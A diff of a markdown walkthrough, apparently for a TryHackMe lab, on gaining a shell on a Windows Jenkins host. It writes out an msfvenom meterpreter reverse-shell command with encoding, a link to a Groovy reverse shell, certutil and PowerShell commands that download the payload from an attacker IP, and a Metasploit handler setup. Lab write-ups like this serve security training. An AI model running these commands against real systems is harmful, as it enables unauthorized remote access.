@@ -216,26 +216,111 @@ Use msfvenom to create a Windows meterpreter reverse shell using the following p
 ```
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
 ```
+Next to transfer it, I tried groovy shell in script console in manage jenkins section, clearly a less stable option than the recommended powershell only option. 
+
+## Trying to connect using groovy:
 So starters quick reverse shell back in using groovy instead it appears easier, here is one link for a classic groovy reverse shell:
 ```
+groovy shell from googlesearch was same as one found on revshells.com
 https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
 ```
-Its the same as reverse shell rom revshells.com, except String cmd="sh" is String cmd="cmd.exe" and of course change ip and port as normal.
+Exactly same except String cmd="sh" is String cmd="cmd.exe" and of course change ip and port as normal. Tried cmd="powershell.exe" instead and it just displays 2 lines and fails, groovy seemed easy to crash and definitely did if you tried cmd.exe and typed powershell to jump over to it: 
+```
+Windows PowerShell 
+Copyright (C) 2009 Microsoft Corporation. All rights reserved.
+```
 
-This reverse‑shell method seemed to crash when I tried transitioning to PowerShell—just using that word caused the session to break. From that point, certutil was the best option for transferring a file. However, when using the VPN, the target at IP:8080 was reachable until a password was entered. Because of that, I had to use the attack box directly.
+## Trying upload payload methods here:
 
-This created a new issue: port 80 was no longer usable, which meant I couldn’t rely on python3 -m http.server 80. The environment did allow port 443, though.
+### Trying to use certutil:
 ```
 certutil.exe -urlcache -split -f http://<targetIP>/shell-name.exe shell-name.exe
-or just
 ```
 
-.I also tried using copy, but CMD doesn’t support copying via port numbers because it relies on SMB. According to Nmap, SMB wasn’t available on the target, and even if it had been, the copy \\IP\file method still wouldn’t have worked because SMB doesn’t allow specifying ports in UNC paths. It only operates over ports 445 or 139 when those services are running. Since neither port was open, copy was never a viable option.
+VPN caused a extremely slow connection to THM target, so much so that attackbox was really only feasible way to use site. This created a new issue: port 80 was no longer usable by any listener as required by attackbox connection. The environment did allow port 443, though required a TLS certificate to work.
+Should work with either http for 80 and https for 443 to connect to those ports, aparently should work with IP:PORT (whatever port set to). 
+- TryHackMe attackbox used port 80 so not option
+- But 443 tries to connect and fails because of certificate. It seems to be a limitation of environment its running python 3.8, --ssl-key or --ssl-cert were introduced in 3.10+. This became apparent when I tried to create TLS certificate and connected using a python using these flags. There are other options to run a HTTPS server script but thats going to eat to much time up.
+
 ```
+Generated certificate:
+openssl req -new -x509 -keyout key.pem -out cert.pem -days 365 -nodes
+
+then tried to setup server using it, which failed.
+
+python3 -m http.server 443 --bind 0.0.0.0 --ssl-key key.pem --ssl-cert cert.pem
+usage: server.py [-h] [--cgi]
+                 [--bind ADDRESS]
+                 [--directory DIRECTORY]
+                 [port]
+server.py: error: unrecognized arguments: --ssl-key key.pem --ssl-cert cert.pem
+root@ip-10-49-75-238:~/nishang/Shells#
+```
+Process to create a simple server to make TLS work, I tried this and this does not not work as expected. tcpdump -i any port 443 did read packet, but is likely httpd.socket = ssl.wrap_socket drops the packets without error resulting in no sign receiving, likely I did something wrong with the certificate.
+
+```
+#create simple HTTPS server:
+
+import http.server
+import ssl
+
+server_address = ('0.0.0.0', 443)
+httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
+
+httpd.socket = ssl.wrap_socket(
+    httpd.socket,
+    keyfile="key.pem",
+    certfile="cert.pem",
+    server_side=True
+)
+
+print("Serving HTTPS on port 443...")
+httpd.serve_forever()
+```
+- Create certificate required. 
+- Then run the script, should show "Serving HTTPS on port 443..." if working:
+```
+python3 https_server.py
+```
+Then call using the certutil command with https in command.
+```
+certutil -urlcache -split -f https://IP/FileToDownload FileDestination
+```
+if successful should get something like ""GET /shell.exe HTTP/1.1" 200 -"
+But here certificate failed here is a method I beleive should have fixed this but spent too long already on this section alone so this is noted incase I get back to it: 
+
+
+#### create openssl.cnf file containing:
+```
+[req]
+distinguished_name=req
+x509_extensions=v3_req
+prompt=no
+
+[req_distinguished_name]
+CN=10.49.75.238
+
+[v3_req]
+subjectAltName=IP:10.49.75.238
+```
+#### Then generate certificate:
+```
+openssl req -x509 -nodes -days 365 \
+  -newkey rsa:2048 \
+  -keyout key.pem \
+  -out cert.pem \
+  -config openssl.cnf
+```
+
+
+### SMB not option here
+According to Nmap, SMB wasn’t available on the target, and even if it had been, the copy \\IP\file method still wouldn’t have worked because SMB doesn’t allow specifying ports in UNC paths. It only operates over ports 445 or 139 when those services are running. Since neither port was open, copy was never a viable option.
+```
+Not an option:
 copy //ip/folder/file file
 ```
 
-Using the PowerShell command from a CMD shell didn’t work either:
+### Using the PowerShell command from a CMD shell didn’t work, this time failing due to Invoke-WebRequest not being in powershell this time, not surprising its:
 ```
 powershell -command "Invoke-WebRequest -Uri http://<attackerIP>:8000/shell-name.exe -OutFile shell-name.exe"
 ```
@@ -258,7 +343,7 @@ reset the reverse shell.
 ```
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://<attackerIP>:8000/shell-name.exe','shell-name.exe')"
 ```
-ensure msfconsole is ready to listen for connection to the meterpreter shell:
+Ensure msfconsole is ready to listen for connection to the meterpreter shell:
 ```
 use exploit/multi/handler 
 set PAYLOAD windows/meterpreter/reverse_tcp 
